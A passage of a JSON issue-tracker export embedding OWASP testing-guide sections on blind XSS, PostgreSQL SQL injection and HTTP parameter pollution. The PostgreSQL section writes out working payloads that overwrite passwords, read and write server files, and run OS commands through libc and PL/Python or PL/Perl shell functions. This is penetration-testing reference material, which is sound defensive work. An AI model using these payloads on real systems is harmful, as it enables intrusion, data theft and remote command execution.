Scripting\n\nBlind Cross-site Scripting is a form of stored XSS. It generally occurs when the attacker\u2019s payload is saved on the server/infrastructure and later reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application views the attacker\u2019s submission via the backend application, the attacker\u2019s payload will get executed. Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is [XSS Hunter](https://xsshunter.com/).\n\n\u003E Note: Testers should carefully consider the privacy implications of using public or third party services while performing security tests. (See #tools.)\n\n### Gray-Box Testing\n\nGray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and data storage might be known by the pen-tester.\nDepending on the information available, it is normally recommended that testers check how user input is processed by the application and then stored into the backend system. The following steps are recommended:\n\n* Use frontend application and enter input with special/invalid characters\n* Analyze application response(s)\n* Identify presence of input validation controls\n* Access backend system and check if input is stored and how it is stored\n* Analyze source code and understand how stored input is rendered by the application\n\nIf source code is available (as in white-box testing), all variables used in input forms should be analyzed. In particular, programming languages such as PHP, ASP, and JSP make use of predefined variables/functions to store input from HTTP GET and POST requests.\nThe following table summarizes some special variables and functions to look at when analyzing source code:\n\n| **PHP** | **ASP** | **JSP** |\n| --- | --- | --- |\n| \u0060$_GET\u0060 \\- HTTP GET variables | \u0060Request.QueryString\u0060 \\- HTTP GET | \u0060doGet\u0060, \u0060doPost\u0060 servlets - HTTP GET and POST |\n| \u0060$_POST\u0060 \\- HTTP POST variables | \u0060Request.Form\u0060 \\- HTTP POST | \u0060request.getParameter\u0060 \\- HTTP GET/POST variables |\n| \u0060$_REQUEST\u0060 \u2013 HTTP POST, GET and COOKIE variables | \u0060Server.CreateObject\u0060 \\- used to upload files | \u00A0 |\n| \u0060$_FILES\u0060 \\- HTTP File Upload variables | \u00A0 | \u00A0 |\n\n**Note**: The table above is only a summary of the most important parameters but, all user input parameters should be investigated.\n\n## Tools\n\n* [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.\n* [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).\n* [BeEF](https://www.beefproject.com/) is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.\n* [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.\n* [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.\n* [XSS Assistant](https://www.greasespot.net/) Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.\n* [XSS Hunter Portable](https://github.com/mandatoryprogrammer/xsshunter) XSS Hunter finds all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS.","Details":null,"Implication":null,"Recommendation":null,"References":"### OWASP Resources\n\n* [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)\n\n### Books\n\n* Joel Scambray, Mike Shema, Caleb Sima - \u201CHacking Exposed Web Applications\u201D, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0\n* Dafydd Stuttard, Marcus Pinto - \u201CThe Web Application\u2019s Handbook - Discovering and Exploiting Security Flaws\u201D, 2008, Wiley, ISBN 978-0-470-17077-9\n* Jeremiah Grossman, Robert \u201CRSnake\u201D Hansen, Petko \u201Cpdp\u201D D. Petkov, Anton Rager, Seth Fogie - \u201CCross Site Scripting Attacks: XSS Exploits and Defense\u201D, 2007, Syngress, ISBN-10: 1-59749-154-3\n\n### Whitepapers\n\n* [CERT: \u201CCERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests\u201D](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)\n* [Amit Klein: \u201CCross-site Scripting Explained\u201D](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)\n* [Gunter Ollmann: \u201CHTML Code Injection and Cross-site Scripting\u201D](http://www.technicalinfo.net/papers/CSS.html)\n* [CGISecurity.com: \u201CThe Cross Site Scripting FAQ\u201D](https://www.cgisecurity.com/xss-faq.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-03 Testing for HTTP Verb Tampering","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"This content has been merged into: [Test HTTP Methods](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)","TestingInstructions":null,"Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"This content has been merged into: [Test HTTP Methods](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-04 Testing PostgreSQL","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nIn this section, some SQL Injection techniques for PostgreSQL will be discussed. These techniques have the following characteristics:\n\n* PHP Connector allows multiple statements to be executed by using \u0060;\u0060 as a statement separator\n* SQL Statements can be truncated by appending the comment char: \u0060--\u0060.\n* \u0060LIMIT\u0060 and \u0060OFFSET\u0060 can be used in a \u0060SELECT\u0060 statement to retrieve a portion of the result set generated by the \u0060query\u0060\n\nFrom now on it is assumed that \u0060http://www.example.com/news.php?id=1\u0060 is vulnerable to SQL Injection attacks.\n\n\u003Cbr\u003E\n","TestingInstructions":"## How to Test\n\n### Identifying PostgreSQL\n\nWhen a SQL Injection has been found, you need to carefully fingerprint the backend database engine. You can determine that the backend database engine is PostgreSQL by using the *::* cast operator.\n\n#### Examples\n\n\u0060http://www.example.com/store.php?id=1\u00A0AND\u00A01::int=1\u0060\nIn addition, the function *version()* can be used to grab the PostgreSQL banner. This will also show the underlying operating system type and version.\n\n##### Example\n\n\u0060http://www.example.com/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0NULL,version(),NULL\u00A0LIMIT\u00A01\u00A0OFFSET\u00A01--\u0060\nAn example of a banner string that could be returned is:\n\u0060PostgreSQL\u00A08.3.1\u00A0on\u00A0i486-pc-linux-gnu,\u00A0compiled\u00A0by\u00A0GCC\u00A0cc\u00A0(GCC)\u00A04.2.3\u00A0(Ubuntu\u00A04.2.3-2ubuntu4)\u0060\n\n### Blind Injection\n\nFor blind SQL injection attacks, you should take into consideration the following built-in functions:\n\n* String Length \u0060LENGTH(str)\u0060\n* Extract a substring from a given string \u0060SUBSTR(str,index,offset)\u0060\n* String representation with no single quotes \u0060CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)\u0060\n\nStarting at version 8.2, PostgreSQL introduced a built-in function, \u0060pg_sleep(n)\u0060, to make the current session process sleep for \u0060n\u0060 seconds. This function can be leveraged to execute timing attacks (discussed in detail at [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)).\nIn addition, you can easily create a custom \u0060pg_sleep(n)\u0060 in previous versions by using libc:\n\n* \u0060CREATE function pg_sleep(int) RETURNS int AS \u0027/lib/libc.so.6\u0027, \u0027sleep\u0027 LANGUAGE \u0027C\u0027 STRICT\u0060\n\n### Single Quote Unescape\n\nStrings can be encoded, to prevent single quotes escaping, by using \u0060chr()\u0060 function.\n\n* \u0060chr(n)\u0060: Returns the character whose ASCII value corresponds to the number \u0060n\u0060\n* \u0060ascii(n)\u0060: Returns the ASCII value which corresponds to the character \u0060n\u0060\n\nLet\u2019s say you want to encode the string \u2018root\u2019:\n\n\u0060\u0060\u0060\nselect\u00A0ascii(\u0027r\u0027)\n114\nselect\u00A0ascii(\u0027o\u0027)\n111\nselect\u00A0ascii(\u0027t\u0027)\n116\n\u0060\u0060\u0060\n\nWe can encode \u2018root\u2019 as:\n\u0060chr(114)||chr(111)||chr(111)||chr(116)\u0060\n\n#### Example\n\n\u0060http://www.example.com/store.php?id=1;\u00A0UPDATE\u00A0users\u00A0SET\u00A0PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--\u0060\n\n### Attack Vectors\n\n#### Current User\n\nThe identity of the current user can be retrieved with the following SQL SELECT statements:\n\n\u0060\u0060\u0060\nSELECT\u00A0user\nSELECT\u00A0current_user\nSELECT\u00A0session_user\nSELECT\u00A0usename\u00A0FROM\u00A0pg_user\nSELECT\u00A0getpgusername()\n\u0060\u0060\u0060\n\n##### Example\n\n\u0060\u0060\u0060\nhttp://www.example.com/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0user,NULL,NULL--\nhttp://www.example.com/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0current_user,\u00A0NULL,\u00A0NULL--\n\u0060\u0060\u0060\n\n#### Current Database\n\nThe built-in function current\\_database() returns the current database name.\n\n##### Example\n\n\u0060http://www.example.com/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0current_database(),NULL,NULL--\u0060\n\n#### Reading from a File\n\nPostgreSQL provides two ways to access a local file:\n\n* \u0060COPY\u0060 statement\n* \u0060pg_read_file()\u0060 internal function (starting from PostgreSQL 8.1)\n\n##### COPY\n\nThis operator copies data between a file and a table. The PostgreSQL engine accesses the local file system as the \u0060postgres\u0060 user.\n\n###### Example\n\n\u0060\u0060\u0060\n/store.php?id=1;\u00A0CREATE\u00A0TABLE\u00A0file_store(id\u00A0serial,\u00A0data\u00A0text)--\n/store.php?id=1;\u00A0COPY\u00A0file_store(data)\u00A0FROM\u00A0\u0027/var/lib/postgresql/.psql_history\u0027--\n\u0060\u0060\u0060\n\nData should be retrieved by performing a \u0060UNION Query SQL Injection\u0060:\n\n* retrieves the number of rows previously added in \u0060file_store\u0060 with \u0060COPY\u0060 statement\n* retrieves a row at a time with UNION SQL Injection\n\n\u0060\u0060\u0060\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0NULL,\u00A0NULL,\u00A0max(id)::text\u00A0FROM\u00A0file_store\u00A0LIMIT\u00A01\u00A0OFFSET\u00A01;--\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0data,\u00A0NULL,\u00A0NULL\u00A0FROM\u00A0file_store\u00A0LIMIT\u00A01\u00A0OFFSET\u00A01;--\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0data,\u00A0NULL,\u00A0NULL\u00A0FROM\u00A0file_store\u00A0LIMIT\u00A01\u00A0OFFSET\u00A02;--\n...\n...\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0data,\u00A0NULL,\u00A0NULL\u00A0FROM\u00A0file_store\u00A0LIMIT\u00A01\u00A0OFFSET\u00A011;--\n\u0060\u0060\u0060\n\n##### pg\\_read\\_file()\n\nThis function was introduced in \u0060PostgreSQL 8.1\u0060 and allows one to read arbitrary files located inside DBMS data directory.\n\n###### Example\n\n\u0060SELECT pg_read_file(\u0027server.key\u0027,0,1000);\u0060\n\n#### Writing to a File\n\nBy reverting the COPY statement, we can write to the local file system with the \u0060postgres\u0060 user rights\n\u0060/store.php?id=1;\u00A0COPY\u00A0file_store(data)\u00A0TO\u00A0\u0027/var/lib/postgresql/copy_output\u0027--\u0060\n\n#### Shell Injection\n\nPostgreSQL provides a mechanism to add custom functions by using both Dynamic Library and scripting languages such as python, perl, and tcl.\n\n##### Dynamic Library\n\nUntil PostgreSQL 8.1, it was possible to add a custom function linked with \u0060libc\u0060:\n\u0060CREATE FUNCTION system(cstring) RETURNS int AS \u0027/lib/libc.so.6\u0027, \u0027system\u0027 LANGUAGE \u0027C\u0027 STRICT\u0060\nSince \u0060system\u0060 returns an \u0060int\u0060 how we can fetch results from \u0060system\u0060 stdout?\nHere\u2019s a little trick:\n\n* create a \u0060stdout\u0060 table: \u0060CREATE TABLE stdout(id serial, system_out text)\u0060\n* executing a shell command redirecting its \u0060stdout\u0060: \u0060SELECT system(\u0027uname -a \u003E /tmp/test\u0027)\u0060\n* use a \u0060COPY\u0060 statements to push output of previous command in \u0060stdout\u0060 table: \u0060COPY stdout(system_out) FROM \u0027/tmp/test*\u0027\u0060\n* retrieve output from \u0060stdout\u0060: \u0060SELECT system_out FROM stdout\u0060\n\n###### Example\n\n\u0060\u0060\u0060\n/store.php?id=1;\u00A0CREATE\u00A0TABLE\u00A0stdout(id\u00A0serial,\u00A0system_out\u00A0text)\u00A0--\n/store.php?id=1;\u00A0CREATE\u00A0FUNCTION\u00A0system(cstring)\u00A0RETURNS\u00A0int\u00A0AS\u00A0\u0027/lib/libc.so.6\u0027,\u0027system\u0027\u00A0LANGUAGE\u00A0\u0027C\u0027\nSTRICT\u00A0--\n/store.php?id=1;\u00A0SELECT\u00A0system(\u0027uname\u00A0-a\u00A0\u003E\u00A0/tmp/test\u0027)\u00A0--\n/store.php?id=1;\u00A0COPY\u00A0stdout(system_out)\u00A0FROM\u00A0\u0027/tmp/test\u0027\u00A0--\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0NULL,(SELECT\u00A0system_out\u00A0FROM\u00A0stdout\u00A0ORDER\u00A0BY\u00A0id\u00A0DESC),NULL\u00A0LIMIT\u00A01\u00A0OFFSET\u00A01--\n\u0060\u0060\u0060\n\n##### Plpython\n\nPL/Python allows users to code PostgreSQL functions in python. It\u2019s untrusted so there is no way to restrict what user can do. It\u2019s not installed by default and can be enabled on a given database by \u0060CREATELANG\u0060\n\n* Check if PL/Python has been enabled on a database: \u0060SELECT count(*) FROM pg_language WHERE lanname=\u0027plpythonu\u0027\u0060\n* If not, try to enable: \u0060CREATE LANGUAGE plpythonu\u0060\n* If either of the above succeeded, create a proxy shell function: \u0060CREATE FUNCTION proxyshell(text) RETURNS text AS \u0027import os; return os.popen(args[0]).read() \u0027LANGUAGE plpythonu\u0060\n* Have fun with: \u0060SELECT proxyshell(os command);\u0060\n\n###### Example\n\n* Create a proxy shell function: \u0060/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS \u2018import os;return os.popen(args[0]).read()\u2019 LANGUAGE plpythonu;--\u0060\n* Run an OS Command: \u0060/store.php?id=1 UNION ALL SELECT NULL, proxyshell(\u0027whoami\u0027), NULL OFFSET 1;--\u0060\n\n##### Plperl\n\nPlperl allows us to code PostgreSQL functions in perl. Normally, it is installed as a trusted language in order to disable runtime execution of operations that interact with the underlying operating system, such as \u0060open\u0060. By doing so, it\u2019s impossible to gain OS-level access. To successfully inject a proxyshell like function, we need to install the untrusted version from the \u0060postgres\u0060 user, to avoid the so-called application mask filtering of trusted/untrusted operations.\n\n* Check if PL/perl-untrusted has been enabled: \u0060SELECT count(*) FROM pg_language WHERE lanname=\u0027plperlu\u0027\u0060\n* If not, assuming that sysadm has already installed the plperl package, try: \u0060CREATE LANGUAGE plperlu\u0060\n* If either of the above succeeded, create a proxy shell function: \u0060CREATE FUNCTION proxyshell(text) RETURNS text AS \u0027open(FD,\u0022$_[0] |\u0022);return join(\u0022\u0022,\u003CFD\u003E);\u0027 LANGUAGE plperlu\u0060\n* Have fun with: \u0060SELECT proxyshell(os command);\u0060\n\n###### Example\n\n* Create a proxy shell function: \u0060/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS \u0027open(FD,\u0022$_[0] |\u0022);return join(\u0022\u0022,\u003CFD\u003E);\u0027 LANGUAGE plperlu;\u0060\n* Run an OS Command: \u0060/store.php?id=1 UNION ALL SELECT NULL, proxyshell(\u0027whoami\u0027), NULL OFFSET 1;--\u0060\n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":"* [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)\n* [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n* [PostgreSQL Official Documentation](https://www.postgresql.org/docs/)\n* [Bernardo Damele and Daniele Bellucci: sqlmap, a blind SQL injection tool](https://sqlmap.org/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-04 Testing for HTTP Parameter Pollution","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nHTTP Parameter Pollution tests the applications response to receiving multiple HTTP parameters with the same name; for example, if the parameter \u0060username\u0060 is included in the GET or POST parameters twice.\nSupplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values. As HTTP Parameter Pollution (in short *HPP*) affects a building block of all web technologies, server and client-side attacks exist.\nCurrent HTTP standards do not include guidance on how to interpret multiple input parameters with the same name. For instance, [RFC 3986](https://www.ietf.org/rfc/rfc3986.txt) simply defines the term *Query String* as a series of field-value pairs and [RFC 2396](https://www.ietf.org/rfc/rfc2396.txt) defines classes of reversed and unreserved query string characters. Without a standard in place, web application components handle this edge case in a variety of ways (see the table below for details).\nBy itself, this is not necessarily an indication of vulnerability. However, if the developer is not aware of the problem, the presence of duplicated parameters may produce an anomalous behavior in the application that can be potentially exploited by an attacker. As often in security, unexpected behaviors are a usual source of weaknesses that could lead to HTTP Parameter Pollution attacks in this case. To better introduce this class of vulnerabilities and the outcome of HPP attacks, it is interesting to analyze some real-life examples that have been discovered in the past.\n\n### Input Validation and Filters Bypass\n\nIn 2009, immediately after the publication of the first research on HTTP Parameter Pollution, the technique received attention from the security community as a possible way to bypass web application firewalls.\nOne of these flaws, affecting *ModSecurity SQL Injection Core Rules*, represents a perfect example of the impedance mismatch between applications and filters. The ModSecurity filter would correctly apply a deny list for the following string: \u0060select 1,2,3 from table\u0060, thus blocking this example URL from being processed by the web server: \u0060/index.aspx?page=select 1,2,3 from table\u0060. However, by exploiting the concatenation of multiple HTTP parameters, an attacker could cause the application server to concatenate the string after the ModSecurity filter already accepted the input. As an example, the URL \u0060/index.aspx?page=select 1\u0026page=2,3\u0060 from table would not trigger the ModSecurity filter, yet the application layer would concatenate the input back into the full malicious string.\nAnother HPP vulnerability turned out to affect *Apple Cups*, the well-known printing system used by many UNIX systems. Exploiting HPP, an attacker could easily trigger a Cross-Site Scripting vulnerability using the following URL: \u0060http://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)\u0026kerberos\u0060. The application validation checkpoint could be bypassed by adding an extra \u0060kerberos\u0060 argument having a valid string (e.g. empty string). As the validation checkpoint would only consider the second occurrence, the first \u0060kerberos\u0060 parameter was not properly sanitized before being used to generate dynamic HTML content. Successful exploitation would result in JavaScript code execution under the context of the hosting site.\n\n### Authentication Bypass\n\nAn even more critical HPP vulnerability was discovered in *Blogger*, the popular blogging platform. The bug allowed malicious users to take ownership of the victim\u2019s blog by using the following HTTP request (\u0060https://www.blogger.com/add-authors.do\u0060):\n\n\u0060\u0060\u0060\nPOST /add-authors.do HTTP/1.1\n[...]\n\nsecurity_token=attackertoken\u0026blogID=attackerblogidvalue\u0026blogID=victimblogidvalue\u0026authorsList=goldshlager19test%40gmail.com(attacker email)\u0026ok=Invite\n\u0060\u0060\u0060\n\nThe flaw resided in the authentication mechanism used by the web application, as the security check was performed on the first \u0060blogID\u0060 parameter, whereas the actual operation used the second occurrence.\n\n### Expected Behavior by Application Server\n\nThe following table illustrates how different web technologies behave in presence of multiple occurrences of the same HTTP parameter.\nGiven the URL and querystring: \u0060http://example.com/?color=red\u0026color=blue\u0060\n\n| Web Application Server Backend | Parsing Result | Example |\n| ------------------------------ | -------------- | ------- |\n| ASP.NET / IIS | All occurrences concatenated with a comma | color=red,blue |\n| ASP / IIS | All occurrences concatenated with a comma | color=red,blue |\n| .NET Core 3.1 / Kestrel | All occurrences concatenated with a comma | color=red,blue |\n| .NET 5 / Kestrel | All occurrences concatenated with a comma | color=red,blue |\n| PHP / Apache | Last occurrence only | color=blue |\n| PHP / Zeus | Last occurrence only | color=blue |\n| JSP, Servlet / Apache Tomcat | First occurrence only | color=red |\n| JSP, Servlet / Oracle Application Server 10g | First occurrence only | color=red |\n| JSP, Servlet / Jetty | First occurrence only | color=red |\n| IBM Lotus Domino | Last occurrence only | color=blue |\n| IBM HTTP Server | First occurrence only | color=red |\n| Node.js / express | First occurrence only | color=red |\n| mod\\_perl, libapreq2 / Apache | First occurrence only | color=red |\n| Perl CGI / Apache | First occurrence only | color=red |\n| mod\\_wsgi (Python) / Apache | First occurrence only | color=red |\n| Python / Zope | All occurrences in List data type | color=[\u2018red\u2019,\u2019blue\u2019] |\n\n(source: [Appsec EU 2009 Carettoni \u0026 Paola](https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf))","TestingInstructions":"## Test Objectives\n\n* Identify the backend and the parsing method used.\n* Assess injection points and try bypassing input filters using HPP.\n\n## How to Test\n\nLuckily, because the assignment of HTTP parameters is typically handled via the web application server, and not the application code itself, testing the response to parameter pollution should be standard across all pages and actions. However, as in-depth business logic knowledge is necessary, testing HPP requires manual testing. Automatic tools can only partially assist auditors as they tend to generate too many false positives. In addition, HPP can manifest itself in client-side and server-side components.\n\n### Server-Side HPP\n\nTo test for HPP vulnerabilities, identify any form or action that allows user-supplied input. Query string parameters in HTTP GET requests are easy to tweak in the navigation bar of the browser. If the form action submits data via POST, the tester will need to use an intercepting proxy to tamper with the POST data as it is sent to the server. Having identified a particular input parameter to test, one can edit the GET or POST data by intercepting the request, or change the query string after the response page loads. To test for HPP vulnerabilities simply append the same parameter to the GET or POST data but with a different value assigned.\nFor example: if testing the \u0060search_string\u0060 parameter in the query string, the request URL would include that parameter name and value:\n\n\u0060\u0060\u0060\nhttp://example.com/?search_string=kittens\n\u0060\u0060\u0060\n\nThe particular parameter might be hidden among several other parameters, but the approach is the same; leave the other parameters in place and append the duplicate:\n\n\u0060\u0060\u0060\nhttp://example.com/?mode=guest\u0026search_string=kittens\u0026num_results=100\n\u0060\u0060\u0060\n\nAppend the same parameter with a different value:\n\n\u0060\u0060\u0060\nhttp://example.com/?mode=guest\u0026search_string=kittens\u0026num_results=100\u0026search_string=puppies\n\u0060\u0060\u0060\n\nand submit the new request.\nAnalyze the response page to determine which value(s) were parsed. In the above example, the search results may show \u0060kittens\u0060, \u0060puppies\u0060, some combination of both (\u0060kittens,puppies\u0060 or \u0060kittens~puppies\u0060 or \u0060[\u0027kittens\u0027,\u0027puppies\u0027]\u0060), may give an empty result, or error page.\nThis behavior, whether using the first, last, or combination of input parameters with the same name, is very likely to be consistent across the entire application. Whether or not this default behavior reveals a potential vulnerability depends on the specific input validation and filtering specific to a particular application. As a general rule: if existing input validation and other security mechanisms are sufficient on single inputs, and if the server assigns only the first or last polluted parameters, then parameter pollution does not reveal a vulnerability. If the duplicate parameters are concatenated, different web application components use different occurrences or testing generates an error, there is an increased likelihood of being able to use parameter pollution to trigger security vulnerabilities.\nA more in-depth analysis would require three HTTP requests for each HTTP parameter:\n\n1. Submit an HTTP request containing the standard parameter name and value, and record the HTTP response. E.g. \u0060page?par1=val1\u0060\n2. Replace the parameter value with a tampered value, submit and record the HTTP response. E.g. \u0060page?par1=HPP_TEST1\u0060\n3. Send a new request combining step (1) and (2). Again, save the HTTP response. E.g. \u0060page?par1=val1\u0026par1=HPP_TEST1\u0060\n4. Compare the responses obtained during all previous steps. If the response from (3) is different from (1) and the response from (3) is also different from (2), there is an impedance mismatch that may be eventually abused to trigger HPP vulnerabilities.\n\nCrafting a full exploit from a parameter pollution weakness is beyond the scope of this text. See the references for examples and details.\n\n### Client-Side HPP\n\nSimilarly to server-side HPP, manual testing is the only reliable technique to audit web applications in order to detect parameter pollution vulnerabilities affecting client-side components. While in the server-side variant the attacker leverages a vulnerable web application to access protected data or to perform actions that are either not permitted or not supposed to be executed, client-side attacks aim at subverting client-side components and technologies.\nTo test for HPP client-side vulnerabilities, identify any form or action that allows user input and shows a result of that input back to the user. A search page is ideal, but a login box might not work (as it might not show an invalid username back to the user).\nSimilarly to server-side HPP, pollute each HTTP parameter with \u0060%26HPP_TEST\u0060 and look for *url-decoded* occurrences of the user-supplied payload:\n\n* \u0060\u0026HPP_TEST\u0060\n* \u0060\u0026amp;HPP_TEST\u0060\n* etc.\n\nIn particular, pay attention to responses having HPP vectors within \u0060data\u0060, \u0060src\u0060, \u0060href\u0060 attributes or forms actions. Again, whether or not this default behavior reveals a potential vulnerability depends on the specific input validation, filtering and application business logic. In addition, it is important to notice that this vulnerability can also affect query string parameters used in XMLHttpRequest (XHR), runtime attribute creation and other plugin technologies (e.g. Adobe Flash\u2019s flashvars variables).\n\n## Tools\n\n* [ZAP Passive/Active Scanners](https://www.zaproxy.org/)","Details":null,"Implication":null,"Recommendation":null,"References":"* [HTTP Parameter Pollution - Luca Carettoni, Stefano di Paola](https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf)\n* [Client-side HTTP Parameter Pollution Example (Yahoo! Classic Mail flaw) - Stefano di Paola](https://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html)\n* [How to Detect HTTP Parameter Pollution Attacks - Chrysostomos Daniel](https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/)\n* [CAPEC-460: HTTP Parameter Pollution (HPP) - Evgeny Lebanidze](https://capec.mitre.org/data/definitions/460.html)\n* [Automated Discovery of Parameter Pollution Vulnerabilities in Web Applications - Marco Balduzzi, Carmen Torrano Gimenez, Davide Balzarotti, Engin 